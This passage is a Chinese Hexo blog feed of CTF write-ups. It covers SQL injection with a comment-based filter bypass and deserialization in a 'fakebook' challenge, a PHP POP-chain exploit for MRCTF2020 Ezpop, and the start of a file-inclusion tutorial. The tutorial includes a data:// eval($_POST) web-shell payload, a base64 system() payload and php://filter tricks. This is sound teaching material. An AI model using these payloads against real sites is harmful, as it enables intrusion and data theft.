+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a><code>sql</code>注入</h3><p><strong>这里黑名单中有<code>union select</code>，使用内联注释符<code>/**/</code>绕过，即等价的<code>union/**/select</code>可以绕过。</strong></p>
+<p>爆列名</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?no=-<span class="number">1</span> unIon<span class="comment">/**/</span>select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(column_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns where table_schema=<span class="string">&#x27;fakebook&#x27;</span> <span class="keyword">and</span> table_name=<span class="string">&#x27;users&#x27;</span>--+</span><br></pre></td></tr></table></figure>
+
+<p><code>users</code>表中各字段的位置对应<code>payload</code>中的<code>1,group_concat(column_name),3,4</code>，所以后面我们的<code>payload</code>应该在第四个位置</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102035768.png" alt="QQ_1732072814962" style="zoom:50%;" />
+
+<p>爆<code>data</code>字段</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?no=-<span class="number">1</span> unIon<span class="comment">/**/</span>select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(data),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> users--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>得到<code>data</code>字段的内容后，再联系前面的<code>UserInfo</code>类，二者应该是存在序列化与反序列化的关系。</p>
+<p><code>data</code>段的内容是将<code>UserInfo</code>类中的对象序列化后的结果，所以我们可以直接修改<code>data</code>段中的<code>blog</code>为<code>file:///var/www/html/flag.php</code>，然后反序列化后<code>UserInfo</code>类中的<code>$this-&gt;blog</code>也就成了<code>file:///var/www/html/flag.php</code>，成功绕过过滤</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102035165.png" alt="image-20241120112823166" style="zoom:80%;" />
+
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>构造如下<code>payload</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?no=-<span class="number">1</span> unIon<span class="comment">/**/</span>select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:2:&quot;jt&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span> <span class="keyword">from</span> users--+</span><br></pre></td></tr></table></figure>
+
+<p>成功注入，查看源码</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102036674.png" alt="image-20241120114623110" style="zoom: 50%;" />
+
+<p>点击<code>url</code></p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102036738.png" alt="QQ_1732074469634" style="zoom:80%;" />
+
+<p>得到<code>flag</code></p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102034446.png" alt="image-20241120114817983" style="zoom: 67%;" />
+
+<h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h1><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a><code>__wakeup()</code></h4><p>该魔术方法在反序列化的时候自动调用，为反序列化生成的对象做一些初始化操作。</p>
+<p><strong>对<code>Show</code>类实例化一个对象赋给<code>$a</code>，将其序列化再反序列化，即可触发。</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__wakeup()&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>直接反序列化<code>O:4:&quot;Hwaz&quot;:1:&#123;s:2:&quot;jt&quot;;N;&#125;</code>，也会触发魔术方法<code>__wakeup()</code>：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__wakeup()&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString()&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;Hwaz&quot;:1:&#123;s:2:&quot;jt&quot;;N;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a><code>__toString()</code></h4><p>当类被当作字符串输出或被作为参数等调用时，会自动调用。</p>
+<p><strong>在<code>__wakeup()</code>里，<code>preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)</code>语句会将<code>$this-&gt;source</code>当做字符串，使<code>$this-&gt;source</code>成为一个类的对象，即可触发。</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;                          <span class="comment">#这里$this-&gt;source被当成字符串利用了</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString()&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="keyword">new</span> <span class="title class_">Show</span>();   <span class="comment">#</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="get"><a href="#get" class="headerlink" title="__get()"></a><code>__get()</code></h4><p>当访问类中的，不可访问的属性，或者是不存在的属性，会自动触发，<code>__get()</code>必须要有参数。</p>
+<p><strong><code>__toString()</code>中的<code>$this-&gt;str-&gt;source</code>是突破点。使<code>$this-&gt;str</code>成为一个类的对象，只要这个类中不存在<code>source</code>这个属性，即可触发。</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__get()&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="keyword">new</span> <span class="title class_">Show</span>();   <span class="comment">#$p-&gt;source是一个对象</span></span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str = <span class="keyword">new</span> <span class="title class_">Test</span>();   <span class="comment">#不能是$a-&gt;str = new Test()</span></span><br><span class="line"><span class="variable">$pp</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$pp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​	要特别注意的一点，虽然有<code>$a = new Show()</code>，但是在<code>$a-&gt;source = new Show()</code>后，后面所有的<code>$a</code>需要用<code>$a-&gt;source</code>代替。</p>
+<h4 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a><code>__invoke()</code></h4><p>当尝试以调用函数的方式调用一个对象时，方法会被自动调用。</p>
+<p><strong>在<code>__get()</code>中，会把<code>function()</code>当作函数调用，而<code>$function = $this-&gt;p</code>，所以只需使<code>$this-&gt;p</code>成为一个对象，即可触发。</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__invoke()&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="keyword">new</span> <span class="title class_">Show</span>();   <span class="comment">#$p-&gt;source是一个对象</span></span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str = <span class="keyword">new</span> <span class="title class_">Test</span>();   <span class="comment">#不能是$a-&gt;str = new Test()</span></span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str-&gt;p = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$pp</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$pp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><p>​	触发<code>__invoke()</code>后，便能调用<code>append()</code>函数，进而调用<code>include()</code>函数触发文件包含漏洞，再使参数<code>$this-&gt;var</code>为<code>php://filter/read=convert.base64-encode/resource=flag.php</code>传参即可拿到<code>flag</code>。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString()&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__get()&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">    <span class="comment">#源码中$var是protected属性，要与源码一致</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str-&gt;p = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$pp</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用<code>url</code>绕过，再对得到的内容进行<code>base64</code>解码，即可得到<code>flag</code>。</p>
+<p>参考：</p>
+<p><a href="https://www.cnblogs.com/karsa/p/12806945.html">刷题[MRCTF2020]Ezpop</a></p>
+<p><a href="https://www.cnblogs.com/WeQi-Blog/p/16071852.html">[MRCTF2020]Ezpop</a></p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含基础知识学习</title>
+    <url>/2024/10/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p>文件包含漏洞（File Inclusion Vulnerability）是一种常见的 Web  安全漏洞，它允许攻击者通过控制输入参数，使应用程序包含并执行本地或远程服务器上的任意文件内容。这种漏洞通常出现在 PHP  等动态语言中，当应用程序使用用户输入作为文件路径参数，且未对输入进行严格验证和过滤时，攻击者可以利用这一点，包含恶意文件（如本地配置文件、远程恶意脚本等），从而获取敏感信息、执行任意代码或进一步攻击系统。</p>
+<span id="more"></span>
+
+<h1 id="基础知识学习"><a href="#基础知识学习" class="headerlink" title="基础知识学习"></a>基础知识学习</h1><p>下面是几个示例，是文件包含函数最基础的用法，用来解析文件。</p>
+<h4 id="包含服务器文件（远程包含）"><a href="#包含服务器文件（远程包含）" class="headerlink" title="包含服务器文件（远程包含）"></a>包含服务器文件（远程包含）</h4><p>需要在<code>phpini</code>中配置：</p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span> = <span class="literal">On</span></span><br><span class="line"><span class="attr">allow_url_include</span> = <span class="literal">On</span></span><br></pre></td></tr></table></figure>
+
+<p>访问<code>http://localhost/eclipse_workspace/firstpro/exp.php?sh=http://www.baidu.com</code></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102016894.png" alt="image-20250116152345994"></p>
+<h4 id="包含本地文件"><a href="#包含本地文件" class="headerlink" title="包含本地文件"></a>包含本地文件</h4><p>可以解析<code>php</code>文件，并将其他类型的文件，其内容当成<code>php</code>代码解析</p>
+<p>被包含文件：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># test.txt</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;dir&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>包含文件：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#exp.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>绝对路径访问：</p>
+<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">?fie=D:\Users\<span class="keyword">install</span>\<span class="keyword">test</span>.txt</span><br></pre></td></tr></table></figure>
+
+<p><code>file://</code>协议访问：</p>
+<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">file</span>=<span class="keyword">file</span>://D:\Users\<span class="keyword">install</span>\<span class="keyword">test</span>.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="allow-url-include"><a href="#allow-url-include" class="headerlink" title="allow_url_include"></a><code>allow_url_include</code></h4><p>​	在_php_ 中，<code>allow_url_include</code>是一个配置指令，用来控制是否允许使用<code>include</code>或<code>require</code>语句，来包含并执行外部文件。<code>allow_url_include</code>可以在<code>php.ini</code>文件中设置，或者在运行时通过<code>ini_set()</code>函数动态设置。以下是两个设置的例子：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//init</span></span><br><span class="line">allow_url_include = On</span><br><span class="line"><span class="comment">//php复制</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;allow_url_include&#x27;</span>, <span class="string">&#x27;1&#x27;</span>); <span class="comment">// 开启</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="动态执行代码"><a href="#动态执行代码" class="headerlink" title="动态执行代码"></a>动态执行代码</h4><p>可以直接执行php代码，如下：</p>
+<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">data://text/plain,</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;sh&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">#蚁剑可直连</span></span><br></pre></td></tr></table></figure>
+
+<p>绕过一些过滤，将要执行的代码进行base64加密：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">data:<span class="regexp">//</span>text<span class="regexp">/plain;base64,PD9waHAgc3lzdGVtKCdkaXInKTs/</span>Pg==</span><br></pre></td></tr></table></figure>
+
+<h4 id="结合file-get-contents利用"><a href="#结合file-get-contents利用" class="headerlink" title="结合file_get_contents利用"></a>结合<code>file_get_contents</code>利用</h4><p><code>file_get_contents()</code>函数用来读取文件内容，伪协议<code>data://</code>可以结合该函数利用。</p>
+<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="meta">#flag文件</span></span><br><span class="line"><span class="built_in">flag</span>&#123;This-is-the-<span class="built_in">flag</span>-<span class="number">123</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>file_get_contents()</code>函数可以直接读取文件内容，传入文件名即可：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#exp.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102014809.png" alt="image-20250124153021803"></p>
+<p>利用<code>data://</code>伪协议覆盖要读的内容：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102015083.png" alt="image-20250124153340202"></p>
+<h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><h2 id="php-filter伪协议"><a href="#php-filter伪协议" class="headerlink" title="php:&#x2F;&#x2F;filter伪协议"></a>php:&#x2F;&#x2F;filter伪协议</h2><p>官方介绍：</p>
+<blockquote>
+<p>php:&#x2F;&#x2F;filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似  readfile()、 file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。</p>
+</blockquote>
+<p>使用方法：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php://filter(/read或/write)/过滤器|过滤器/resource=要过滤的数据流</span><br></pre></td></tr></table></figure>
+
+<p><strong>filter后面可以套多层目录。</strong>过滤器可以设置多个，使用管道符<code>|</code>分隔，按照从左到右的顺序依次使用相应的过滤器进行过滤处理。</p>
+<p>过滤器分类</p>
+<ul>
+<li><p>字符串过滤器：以string开头，常见过滤器有rot13、toupper、tolower、strip_tags等。string.strip_tags自PHP 7.3.0起废弃。</p>
+</li>
+<li><p>转换过滤器：以convert开头，主要含三类，分别是base64的编码转换，quoted-printable的编码转换，iconv字符编码转换。</p>
+<ol>
+<li><p>base64的编码为base64_encode和base64_decode；</p>
+</li>
+<li><p>quoted-printable为quoted-printable-encode可打印字符引用编码，解码为quoted-printable-decode但是无该解码过滤器；</p>
+</li>
+<li><p>在激活 <a href="https://www.php.net/manual/zh/book.iconv.php">iconv</a>的前提下可以使用<code>convert.iconv.*</code>压缩过滤器，等同于用iconv()处理所有的流数据。</p>
+<ul>
+<li>.utf-8.utf-7：将utf8编码转换utf7编码</li>
+<li>.utf8.utf16：将utf8编码转换utf16编码</li>
+<li>.SJIS*.UCS-4*</li>
+</ul>
